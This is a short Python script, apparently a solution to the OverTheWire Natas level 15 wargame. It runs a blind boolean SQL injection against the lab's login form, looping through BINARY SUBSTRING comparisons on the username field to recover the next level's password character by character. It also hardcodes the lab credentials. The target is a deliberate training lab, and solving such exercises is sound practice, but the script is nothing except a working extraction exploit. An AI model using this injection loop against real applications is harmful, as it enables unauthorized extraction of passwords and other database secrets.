import requests

url = 'http://natas15.natas.labs.overthewire.org'
user = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

natas16_pass = ''
caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
for i in range (1, 33):
    for c in caracteres:
        injection = f'natas16" and BINARY SUBSTRING(password, {i}, 1) = "{c}" #'
        data = {"username": injection}
        response = requests.post(url, auth=(user, password), data=data)
        if "This user exists" in response.text:
            natas16_pass = natas16_pass + c
            print(f'caractere {c} na posição {i}')
            break

print(natas16_pass)
